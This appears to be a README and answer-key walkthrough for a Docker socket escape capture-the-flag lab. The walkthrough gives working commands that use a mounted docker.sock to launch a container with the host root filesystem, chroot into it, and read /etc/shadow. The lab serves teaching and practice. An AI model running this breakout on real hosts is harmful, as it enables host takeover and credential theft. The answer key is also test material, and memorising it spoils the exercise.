### 1. `README.md`

This is the front page of your repository. It sets the stage, explains the scenario, and gives users the deployment instructions.

**Copy and paste this into your `README.md` file:**

```markdown
# Docker Socket Escape Lab (Container Breakout)

Welcome to the Docker Socket Escape Lab. This repository provides a safe, locally deployable Capture The Flag (CTF) style environment to practice container breakout techniques resulting from Docker Daemon UNIX socket misconfigurations.

## 📖 The Scenario
An enterprise organization has deployed an internal web application on an Ubuntu Server. To facilitate CI/CD automation, the system administrator made a critical configuration error: they mounted the host's primary Docker control socket (`/var/run/docker.sock`) directly into the web application's container. 

Assume you have already exploited a Remote Code Execution (RCE) vulnerability in the web application and have gained an initial low-privileged shell inside the container. 

## 🎯 The Objective
Your goal is to leverage the misconfigured Docker socket to:
1. Break out of the isolated container environment.
2. Gain `root` access to the underlying host operating system.
3. Successfully read the contents of the host's `/etc/shadow` file.

## ⚙️ Prerequisites
To run this lab, you need:
* A Linux virtual machine (Ubuntu Server is recommended).
* Docker installed on the target machine.
* A secondary attacker machine (like Kali Linux) on the same network (optional, for scanning practice).

## 🚀 Deployment Instructions
Run the following commands on your target Ubuntu machine to deploy the vulnerable environment:

1. Clone this repository:
   ```bash
   git clone [https://github.com/alfaxgen10/docker-socket-escape-lab.git](https://github.com/alfaxgen10/docker-socket-escape-lab.git)
   cd docker-socket-escape-lab

```

2. Make the setup script executable:
```bash
chmod +x setup_lab.sh

```


3. Deploy the lab:
```bash
./setup_lab.sh

```


4. Access the initial compromised container to start the challenge:
```bash
docker exec -it vulnerable_target bash

```



## ⚠️ Disclaimer

This lab is for educational and ethical hacking purposes only. Do not deploy this vulnerable container on a public-facing server or production environment.

## 💡 Stuck?

If you need a hint or want to see the exact exploit methodology, check the `Solution/walkthrough.md` file in this repository.

```

---

### 2. `Solution/walkthrough.md`
This goes inside a folder named `Solution`. It acts as the "answer key" for your lab. 

**Copy and paste this into `Solution/walkthrough.md`:**

```markdown
# Walkthrough: Docker Socket Escape

If you are stuck, here is the step-by-step methodology to compromise the host.

### Step 1: Vulnerability Identification
Once you are inside the compromised container, check for exposed UNIX sockets. 
```bash
ls -la /var/run/docker.sock

```

*Observation:* The file exists, is marked as a socket (`s`), and is writable by the root user. This means we can communicate directly with the host's Docker daemon.

### Step 2: Exploitation & Container Escape

We will use the Docker client binary mapped from the host to ask the host's Docker daemon to spin up a new, highly privileged container. We will mount the host's entire root directory `/` into a folder called `/hostOS`.

Execute the following payload:

```bash
docker -H unix:///var/run/docker.sock run -it -v /:/hostOS ubuntu bash

```

*Observation:* You are immediately dropped into the shell of a new rogue container.

### Step 3: Impact Analysis & Host Takeover

While you have access to the host files in the `/hostOS` directory, you are still technically constrained by the container's process tree. Break the boundary completely using the `chroot` command.

```bash
chroot /hostOS

```

Verify your privileges:

```bash
id
whoami

```

Extract the target file to complete the lab:

```bash
cat /etc/shadow

```

**Congratulations! You have successfully escaped the container and achieved total host compromise.**

```
